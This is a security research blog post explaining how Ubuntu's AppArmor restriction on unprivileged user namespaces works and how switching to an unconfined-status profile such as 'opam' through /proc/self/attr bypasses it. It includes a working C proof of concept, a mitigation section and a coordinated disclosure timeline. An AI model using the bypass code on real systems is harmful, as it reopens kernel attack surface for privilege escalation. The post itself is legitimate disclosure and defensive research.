---
layout: post
title:  "The Journey of Bypassing Ubuntu’s Unprivileged Namespace Restriction"
categories: linux
---

<img src="/assets/image-20250623000000003.png" alt="image-20250623000000003" style="display: block; margin-left: auto; margin-right: auto; zoom:50%;" />

Recently, Ubuntu introduced sandbox mechanisms to reduce the attack surface, and they seemed unbreakable. However, after carrying out in-depth research, we found that the implementation contained some issues, and bypassing it was not as difficult as expected. This post will explain how we began our research at the kernel level and discovered a bypass method. We will also share some interesting stories from the process.

## 1. Introduction

### 1.1. Ubuntu’s New Sandbox Model

After years of serving as a rich attack surface for privilege escalation, unprivileged user namespaces finally started receiving serious attention. In April 2024, shortly after that year’s Pwn2Own, Ubuntu published a [security-focused blog post](https://ubuntu.com/blog/whats-new-in-security-for-ubuntu-24-04-lts) announcing new mitigations designed to lock down unprivileged namespaces and io_uring. The goal was clear: to ensure that untrusted applications run within a tighter, more controlled sandbox. These restrictions were largely implemented through AppArmor.

Fast forward to September 2024, Ubuntu followed up with a [presentation](https://static.sched.com/hosted_files/lsseu2024/ed/Restricting%20Unprivileged%20User%20Namespaces%20In%20Ubuntu.pdf) introducing their sandbox architecture in more depth. The slides outlined not only the motivation behind the design but also provided a breakdown of how the sandbox operates under the hood.

<img src="/assets/image-20250623000000000.png" alt="image-20250623000000000" style="display: block; margin-left: auto; margin-right: auto; zoom:50%;" />

From these updates, it became evident that Ubuntu’s new model only allows specific applications to create unprivileged namespaces. All other, untrusted processes are blocked. Without access to unprivileged namespaces, attackers lose their entry point to subsystems like netfilter and net/sched — historically fertile ground for discovering vulnerabilities. At first, this seemed like a bulletproof defense. Some researchers even speculated that Ubuntu, formerly the only Linux LPE target at Pwn2Own, might now be effectively unbreakable.

### 1.2. Emergence of the Bypass Method

But then, on February 16, something unexpected happened. I stumbled across a Twitter thread where someone claimed that the new AppArmor-based protections could be bypassed. Seriously? That got my attention.

<img src="/assets/image-20250623000000002.png" alt="image-20250623000000002" style="display: block; margin-left: auto; margin-right: auto; zoom:50%;" />

Coincidentally, Pwn2Own 2025 was just around the corner. It felt like the perfect time to start digging. I decided to analyze how Ubuntu enforces these restrictions via AppArmor — and more importantly, whether there were any cracks in the armor.

To my surprise, it didn’t take long. Within a few hours of reviewing the code, I found a way to bypass them! It wasn’t even particularly difficult to find it, as long as the investigation was conducted in the right direction. With unprivileged namespaces now back on the table, the next step in my plan was straightforward: find a vulnerability in a module of the network subsystem that Ubuntu enables by default but kernelCTF does not. Couldn’t be better!

Unfortunately, things didn’t go so well. Just a week later, on February 24, the official rules for Pwn2Own Berlin were announced, and Ubuntu was off the table because the Linux LPE target was changed to Red Hat Enterprise Linux. To make things worse (for the bypass, at least), RHEL doesn’t restrict unprivileged namespaces at all. Which meant... my bypass was now irrelevant to the competition.

<img src="/assets/image-20250623000000001.png" alt="image-20250623000000001" style="display: block; margin-left: auto; margin-right: auto; zoom:50%;" />

### 1.3. Vendor Response

Upon learning that Ubuntu was no longer a Pwn2Own target, I promptly submitted the issue through the ZDI portal, the platform I usually use for vulnerability reporting. But while I waited for a response, the [researcher (@roddux)](https://x.com/roddux/status/1903028631514837107) posted a bypass method on Twitter on March 21. Later, on March 27, the Qualys Team released a [disclosure](https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-namespace-restrictions.txt) that included more detailed technical explanations. All of these methods are based on a similar root cause as the one I identified.

As a researcher, it was frustrating to see various bypass methods being publicly disclosed while I couldn’t share my own work because I had already reported it to ZDI. After a few days with no updates, I even emailed ZDI to ask if I could withdraw my submission. Fortunately, my boss, Orange Tsai, stepped in just in time and patiently walked me through the pros and cons of doing so. That helped me regain my composure, and I ended up sending another email to retract my withdrawal request.

On April 27, the ZDI team finally reviewed my report, but they said they were not interested in the issue. So, I decided to report it directly to the Ubuntu Security Team. Within a day, I received a quick response from John, one of the maintainers of the namespace restriction mechanism. He said they were verifying the issue and would notify me of any updates. By the way, this was my first time reporting an issue to the Ubuntu Security Team, and their responsiveness and friendliness made it a great experience to collaborate with them.

After about a month of discussion, they finally determined that the issue I reported was a variant of the bypass methods previously disclosed by the Qualys Team. It only works when `/proc/sys/kernel/apparmor_restrict_unprivileged_unconfined` is disabled, which has been enabled by default since Ubuntu 25.04. They had also recommended that users disable it in earlier versions through their [official post](https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007#p-148026-restrict-unprivileged-unconfined-profile-changes).

This post documents my bypass technique and the full disclosure timeline. While the core idea aligns with previously published methods, I believe it is still worth publishing because the method was discovered from a kernel side rather than from userspace. I hope every reader enjoys it!

## 2. AppArmor 101

### 2.1. Overview

**AppArmor (Application Armor)** is an implementation of a Linux Security Module (LSM) that provides Mandatory Access Control (MAC), restricting processes’ access to system resources. Administrators can define an AppArmor profile for a program to limit its capabilities. If a process does not have an AppArmor profile, it runs in **`unconfined` profile**, meaning AppArmor does not impose any restrictions on it.

Each profile defines access control for an individual program, specifying which files, capabilities, and network permissions it can access. Enabled profiles can operate in two modes:
- **Enforced mode**: Violating behavior is blocked and logged.
- **Complain mode**: Violating behavior is only logged but not blocked.

Example profile:

```
abi <abi/4.0>,
include <tunables/global>

profile ipa_verify /usr/bin/ipa_verify flags=(unconfined) {
  userns,

  # Site-specific additions and overrides. See local/README for details.
  include if exists <local/ipa_verify>
}
```
- `profile ipa_verify`: Defines a profile named `ipa_verify`.
- `/usr/bin/ipa_verify`: The profile applies to the binary located at `/usr/bin/ipa_verify`. When executed, this profile is automatically loaded.
- `flags=(unconfined)`: This profile is in unconfined status. Although the profile is loaded, it does not restrict the application’s behavior.
- `userns`: Allows the application to use user namespaces.

Users can use the `aa-status` tool to list active profiles and their statuses. Below is an example JSON output:

```
{
    "version": "2",
    "profiles": {
        "/snap/snapd/23258/usr/lib/snapd/snap-confine": "enforce",
        "/usr/sbin/sssd": "complain",
        "Discord": "unconfined"
    },
    "processes": {
        "/usr/sbin/rsyslogd": [
            {
                "profile": "rsyslogd",
                "pid": "1176",
                "status": "enforce"
            }
        ]
    }
}
```

### 2.2. Behavior in Ubuntu

Users can use the `unshare` tool to execute target binary under an unprivileged user namespace. However, after the introduction of new security mechanisms, executing this command on Ubuntu results in an **"Operation not permitted" (-EPERM)** error.

``` bash
aaa@aaa:~/$ unshare -r -n -m /bin/bash
unshare: write failed /proc/self/uid_map: Operation not permitted
```

At this point, if we check the kernel log using the `dmesg` command, we will see some event logs related to AppArmor.

``` bash
aaa@aaa:~/$ sudo dmesg
[...]
[302291.394909] audit: type=1400 audit(1739761091.573:545): apparmor="AUDIT" operation="userns_create" class="namespace" info="Userns create - transitioning profile" profile="unconfined" pid=29466 comm="unshare" requested="userns_create" target="unprivileged_userns"
[302291.395747] audit: type=1400 audit(1739761091.574:546): apparmor="DENIED" operation="capable" class="cap" profile="unprivileged_userns" pid=29466 comm="unshare" capability=21  capname="sys_admin"
```
1. First AppArmor Event - Audit Event
    - This event logs execution details.
    - The event describes that a process with PID 29466 (`unshare`) attempted to create a user namespace (`operation="userns_create"`).
    - The process is currently unrestricted (`profile="unconfined"`), meaning it’s not bound to any AppArmor profile at the moment.
    - After this event, the process is assigned the `unprivileged_userns` profile.
2. Second AppArmor Event - Deny Event
    - This event indicates a denied operation.
    - The `unprivileged_userns` profile restricts the process from using the `sys_admin` capability.
    - Since unshare requires `sys_admin` to create a new user namespace, AppArmor blocks the operation, leading to the **"Operation not permitted (-EPERM)"** error.

In Ubuntu, all AppArmor profiles are stored in the directory:

``` bash
aaa@aaa:~$ ls -al /etc/apparmor.d/
total 528
drwxr-xr-x   9 root root  4096 Feb 17 10:46 .
drwxr-xr-x 141 root root 12288 Feb 16 20:46 ..
-rw-r--r--   1 root root   354 Oct  2 07:24 1password
...
-rw-r--r--   1 root root   699 Oct  2 07:24 unprivileged_userns
...
```

The file `/etc/apparmor.d/unprivileged_userns` defines the `unprivileged_userns` profile. Below is part of the file’s content:

```
[...]

profile unprivileged_userns {
     audit deny capability,
     audit deny change_profile,

     [...]
     allow mqueue,
     allow ptrace,
     allow userns,
}
```

The second event log we saw in the `dmesg` output comes from the `audit deny capability` rule. This rule blocks all operations that require capabilities such as `CAP_SYS_ADMIN`, `CAP_NET_ADMIN` and `CAP_CHOWN`, and logs any denied requests.

Now that we understand creating a namespace is not allowed under the `unprivileged_userns` profile, a key question arises:

**Why is our process, which starts in the `unconfined` profile, automatically transitioned to the `unprivileged_userns` profile?**

To answer this, we need to dive into the AppArmor implementation in Ubuntu!

## 3. Investigating Ubuntu Kernel Patch

### 3.1. Analysis Strategy

Each Linux distribution modifies the Linux kernel based on its own needs, and Ubuntu is no exception.

When analyzing the Ubuntu source, you will download two files: the base version of the Linux source code (`linux_<ver>.orig.tar.gz`) and a diff file containing Ubuntu’s modifications (`linux_<ver>-<x>.<y>.diff.gz`, where x represents Ubuntu’s maintained subversion, and y is usually a minor or patch release). To analyze Ubuntu’s customizations, the patched source code is usually examined alongside the diff file.

However, taking `linux_6.11.0-18.18.diff` as an example, the patch contains over 260000 lines - so where should one begin?

We can narrow the direction based on heuristics: the unusual behavior of AppArmor is only triggered by the **unshare operation**. Additionally, **certain strings in the audit event logs** can be searched to quickly locate key operations.

### 3.2. Diving Into the Source

The function `apparmor_userns_create()` is triggered as an AppArmor hook and is executed when a namespace is created [1]. This function then calls `aa_profile_ns_perm()` to handle namespace permission-related settings  [2].

``` c
static struct security_hook_list apparmor_hooks[] __ro_after_init = {
    // [...]
    LSM_HOOK_INIT(userns_create, apparmor_userns_create), // [1]
    // [...]
};

static int apparmor_userns_create(const struct cred *new_cred)
{
    struct aa_label *label;
    struct aa_profile *profile;
    int error = 0;

    label = begin_current_label_crit_section();
    if (aa_unprivileged_userns_restricted /* default value: 1 */ ||
        label_mediates(label, AA_CLASS_NS)) {
        // [...]

        new = fn_label_build(label, profile, GFP_KERNEL,
                aa_profile_ns_perm(profile, &ad, // [2]
                           AA_USERNS_CREATE));
        // [...]
    }
    end_current_label_crit_section(label);

    return error;
}
```

When `aa_profile_ns_perm()` detects that the profile is **in unconfined status** [3] and that the currently used profile matches the **`unconfined` profile** [4], it directly applies a hardcoded `unprivileged_userns` profile [5], which corresponds to `/etc/apparmor.d/unprivileged_userns`. This is the AppArmor profile that prevents us from creating unprivileged namespaces.

The following code only includes a portion of the `aa_profile_ns_perm()` function. The full code contains numerous comments with **"TODO"** and **"hardcode"**, indicating that the entire mechanism is still under development.

``` c
struct aa_label *aa_profile_ns_perm(struct aa_profile *profile,
                    struct apparmor_audit_data *ad,
                    u32 request)
{
    struct aa_ruleset *rules = list_first_entry(&profile->rules,
                            typeof(*rules), list);
    struct aa_label *new;
    struct aa_perms perms = { };
    aa_state_t state;

    // [...]
    state = RULE_MEDIATES(rules, ad->class);
    if (!state) {
        if (profile_unconfined(profile) && // [3]
            profile == profiles_ns(profile)->unconfined) { // [4]
            // [...]
            new = aa_label_parse(&profile->label, // [5]
                         "unprivileged_userns", GFP_KERNEL,
                         true, false);
            // [...]
            ad->info = "Userns create - transitioning profile";
            perms.audit = request;
            perms.allow = request;
            goto hard_coded;
        } /* [...] */
    }

    // [...]
hard_coded:
    aa_apply_modes_to_perms(profile, &perms);
    // [...]
    return new;
}
```

How can we determine which profile the current process is using? Intuitively, it should be recorded somewhere under `/proc/self/`. By analyzing the source code and using tools like `grep` and `find` to search for relevant keywords in both file contents and filenames, we eventually locate `/proc/self/attr`.

This directory stores process-related attribute definitions, and within it, there’s a subdirectory named `apparmor`, which contains AppArmor-specific information.

``` bash
aaa@aaa:~/$ ls -al /proc/self/attr
total 0
dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 .
dr-xr-xr-x 9 aaa aaa 0 Feb 17 12:16 ..
dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 apparmor
-rw-rw-rw- 1 aaa aaa 0 Feb 17 12:16 current
-rw-rw-rw- 1 aaa aaa 0 Feb 17 12:16 exec
-rw-rw-rw- 1 aaa aaa 0 Feb 17 12:16 fscreate
-rw-rw-rw- 1 aaa aaa 0 Feb 17 12:16 keycreate
-r--r--r-- 1 aaa aaa 0 Feb 17 12:16 prev
dr-xr-xr-x 2 aaa aaa 0 Feb 17 12:16 smack
-rw-rw-rw- 1 aaa aaa 0 Feb 17 12:16 sockcreate
```

The file `current` within `/proc/self/attr/apparmor` shows the profile currently in use. While it has write permissions, it appears to require a **specific format** for modifications to take effect.

``` bash
aaa@aaa:~/$ cat /proc/self/attr/current
unconfined

aaa@aaa:~/$ echo AAA > /proc/self/attr/current
-bash: echo: write error: Invalid argument
```

By mapping these pseudo-file names back to the source code, we can determine the read/write handlers from the file operations.

``` c
#define ATTR(LSMID, NAME, MODE)             \
    NOD(NAME, (S_IFREG|(MODE)),             \
        NULL, &proc_pid_attr_operations,    \
        { .lsmid = LSMID })

static const struct pid_entry smack_attr_dir_stuff[] = {
    ATTR(LSM_ID_SMACK, "current", 0666),
};
LSM_DIR_OPS(smack);

static const struct pid_entry apparmor_attr_dir_stuff[] = {
    ATTR(LSM_ID_APPARMOR, "current",  0666),
    ATTR(LSM_ID_APPARMOR, "prev",     0444),
    ATTR(LSM_ID_APPARMOR, "exec",     0666),
};
LSM_DIR_OPS(apparmor);

static const struct pid_entry attr_dir_stuff[] = {
    ATTR(LSM_ID_UNDEF, "current",     0666),
    ATTR(LSM_ID_UNDEF, "prev",        0444),
    ATTR(LSM_ID_UNDEF, "exec",        0666),
    ATTR(LSM_ID_UNDEF, "fscreate",    0666),
    ATTR(LSM_ID_UNDEF, "keycreate",   0666),
    ATTR(LSM_ID_UNDEF, "sockcreate",  0666),
    DIR("smack",  0555,
        proc_smack_attr_dir_inode_ops, proc_smack_attr_dir_ops),
    DIR("apparmor",  0555,
        proc_apparmor_attr_dir_inode_ops, proc_apparmor_attr_dir_ops),
};
```

The file ops `proc_pid_attr_operations` defines the function `proc_pid_attr_write()` [6] as the write handler. At a lower level, this function calls AppArmor’s setprocattr hook, which corresponds to the function `apparmor_setprocattr()` [7]. 

``` c
static const struct file_operations proc_pid_attr_operations = {
    // [...]
    .write        = proc_pid_attr_write, // [6]
    // [...]
};

static ssize_t proc_pid_attr_write(struct file * file, const char __user * buf,
                   size_t count, loff_t *ppos)
{
    // [...]
    rv = security_setprocattr(PROC_I(inode)->op.lsmid, // <------------
                  file->f_path.dentry->d_name.name, page,
                  count);
    // [...]
}

int security_setprocattr(int lsmid, const char *name, void *value, size_t size)
{
    struct security_hook_list *hp;

    hlist_for_each_entry(hp, &security_hook_heads.setprocattr, list) {
        if (lsmid != 0 && lsmid != hp->lsmid->id)
            continue;
        return hp->hook.setprocattr(name, value, size); // <------------
    }
    // [...]
}

static struct security_hook_list apparmor_hooks[] __ro_after_init = {
    // [...]
    LSM_HOOK_INIT(setprocattr, apparmor_setprocattr), // [7]
    // [...]
};
```

The function `apparmor_setprocattr()` first converts the target filename into an enum value [8], then calls `do_setattr()` to handle the operation [9].

``` c
static int apparmor_setprocattr(const char *name, void *value,
                size_t size)
{
    int attr = lsm_name_to_attr(name); // [8]

    if (attr)
        return do_setattr(attr, value, size); // [9]
    return -EINVAL;
}

u64 lsm_name_to_attr(const char *name)
{
    if (!strcmp(name, "current"))
        return LSM_ATTR_CURRENT;
    if (!strcmp(name, "exec"))
        return LSM_ATTR_EXEC;
    // [...]
}
```

The function `do_setattr()` begins by parsing the input, where the written data is interpreted in the format `"<command> <profile>"`. It then calls `aa_change_profile()` with different parameters based on the **target file** and the **command** value.

``` c
static int do_setattr(u64 attr, void *value, size_t size)
{
    // [...]
    if (attr == LSM_ATTR_CURRENT) {
        // [...]
        else if (strcmp(command, "changeprofile") == 0) {
            error = aa_change_profile(args, AA_CHANGE_NOFLAGS);
        } else if (strcmp(command, "permprofile") == 0) {
            error = aa_change_profile(args, AA_CHANGE_TEST);
        } else if (strcmp(command, "stack") == 0) {
            error = aa_change_profile(args, AA_CHANGE_STACK);
        } else
            goto fail;
    } else if (attr == LSM_ATTR_EXEC) {
        if (strcmp(command, "exec") == 0)
            error = aa_change_profile(args, AA_CHANGE_ONEXEC);
        else if (strcmp(command, "stack") == 0)
            error = aa_change_profile(args, (AA_CHANGE_ONEXEC |
                             AA_CHANGE_STACK));
        else
            goto fail;
    }
    // [...]
}
```

The function `aa_change_profile()` determines how a profile is applied based on different flags. First, it retrieves the profile object corresponding to the user-provided profile name [10]. Then, it performs different profile updates based on the flags.

If the flag `AA_CHANGE_STACK` is included, AppArmor applies another profile on top of the existing one. The flag `AA_CHANGE_TEST` is used for testing, meaning the profile will not actually be applied.

If neither the `AA_CHANGE_STACK` nor `AA_CHANGE_TEST` flags are set, `aa_change_profile()` creates an AppArmor label object using the retrieved profile [11], and then applies the new label to the current process via either `aa_replace_current_label()` [12] or `aa_set_current_onexec()` [13].

``` c
int aa_change_profile(const char *fqname, int flags)
{
    struct aa_label *label, *new = NULL, *target = NULL;
    
    // [...]
    target = aa_label_parse(label, fqname /* profile name */, GFP_KERNEL, true, false); // [10]

    // [...]
    if (!stack) {
        new = fn_label_build_in_ns(label, profile, GFP_KERNEL, // [11]
                       aa_get_label(target),
                       aa_get_label(&profile->label));
    }

    // [...]
    if (!(flags & AA_CHANGE_ONEXEC)) {
        error = aa_replace_current_label(new); // [12]
    } else {
        if (new) {
            aa_put_label(new);
            new = NULL;
        }
        aa_set_current_onexec(target, stack); // [13]
    }

    // [...]
}
```

In a nutshell, if the target file being written to is `/proc/self/attr/exec` and the data is `"exec <profile>"`, the new profile is applied only after the **process executes `SYS_execve` system call**.

Conversely, if writing to `/proc/self/attr/current` with `"changeprofile <profile>"`, the process’s profile is **updated immediately**.

## 4. Out of the Sandbox

Let’s look back at the checks in `aa_profile_ns_perm()`.

``` c
struct aa_label *aa_profile_ns_perm(struct aa_profile *profile /* ... */)
{
    if (profile_unconfined(profile) && // [1]
        profile == profiles_ns(profile)->unconfined) { // [2]
        // [...]
    }
}
```

The first check examines whether the profile is in unconfined status [1], which can also be bypassed by applying a profile in **complain mode**.

The second check verifies whether the current profile is the `unconfined` profile [2]. Therefore, using a **non-default profile** can bypass this check.

In short, under the current mechanism, simply **applying any profile in unconfined status** allows bypassing the check to create an unprivileged user namespace!

## 5. Proof-Of-Concept

To bypass the restriction, you just need to switch the process’s profile from the default one to another that is in unconfined status. We chose the `opam` profile simply because it is one of the simplest profiles. Its content is as follows:

```
# This profile allows everything and only exists to give the
# application a name instead of having the label "unconfined"

abi <abi/4.0>,
include <tunables/global>

profile opam /usr/bin/opam flags=(unconfined) {
  userns,

  # Site-specific additions and overrides. See local/README for details.
  include if exists <local/opam>
}
```

The following example code uses two methods to create an unprivileged user namespace on Ubuntu 24.10. The tested version is Ubuntu 24.10 (6.11.0-14-generic), and the test date is February 17, 2025.

``` c
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

void perror_exit(const char *msg)
{
    perror(msg);
    exit(1);
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp, ret;
    char edit[0x100] = {};
    ret = unshare(CLONE_NEWNET | CLONE_NEWUSER);
    if (ret < 0) perror_exit("unshare");
    
    temp = open("/proc/self/setgroups", O_WRONLY);
    if (temp < 0) perror_exit("open /proc/self/setgroups");
    
    write(temp, "deny", strlen("deny"));
    close(temp);
    
    temp = open("/proc/self/uid_map", O_WRONLY);
    if (temp < 0) perror_exit("open /proc/self/uid_map");
    
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    if (temp < 0) perror_exit("open /proc/self/gid_map");
    
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    return;
}

const char profile1[] = "exec opam";
const char profile2[] = "changeprofile opam";
char buf[0x100];

void func_1()
{
    int ret;
    int fd = open("/proc/self/attr/exec", O_RDWR);
    if (fd < 0) perror_exit("open /proc/self/attr/exec");

    ret = write(fd, profile1, sizeof(profile1));
    close(fd);

    char *const _argv[] = {"/usr/bin/unshare", "-r", "-n", "-m", "/bin/bash", NULL};
    char *const _envp[] = {NULL};
    execve("/usr/bin/unshare", _argv, _envp);
}

void func_2()
{
    int ret;
    int fd = open("/proc/self/attr/current", O_RDWR);
    if (fd < 0) perror_exit("open /proc/self/attr/current");

    ret = write(fd, profile2, sizeof(profile2));
    close(fd);

    unshare_setup(getuid(), getgid());
    char *const _argv[] = {NULL};
    char *const _envp[] = {NULL};
    execve("/bin/bash", _argv, _envp);
}

int main()
{
    func_1();
    func_2();
}
```

## 6. Mitigation

The bypass method works only when `/proc/sys/kernel/apparmor_restrict_unprivileged_unconfined` is disabled (i.e., set to 0). Versions of Ubuntu later than 25.04 are not affected, as it is enabled by default.

For Ubuntu 24.10 and earlier versions, please refer to the [official post](https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007#p-148026-restrict-unprivileged-unconfined-profile-changes) for instructions on how to prevent any unprivileged and unconfined process from executing `aa-exec` to change its profile.

## 7. Disclosure Timeline

- 2025-02-16: Researcher @roddux mentioned that the namespace restriction is easy to bypass.
- 2025-02-17: I discovered the bypass method.
- 2025-02-24: I reported the issue to the ZDI team.
- 2025-03-21: Researcher @roddux published his bypass method.
- 2025-03-27: The Qualys team, upon noticing @roddux’s publication, also disclosed their advisory.
- 2025-04-27: The ZDI team responded that they are not interested in this type of bug.
- 2025-04-30: I reported the issue to the Ubuntu Security Team.
- 2025-05-01: John, one of the maintainers, notified me that it had entered the initial review stage.
- 2025-05-30: John provided a full analysis of the issue.
- 2025-06-26: Coordinated release.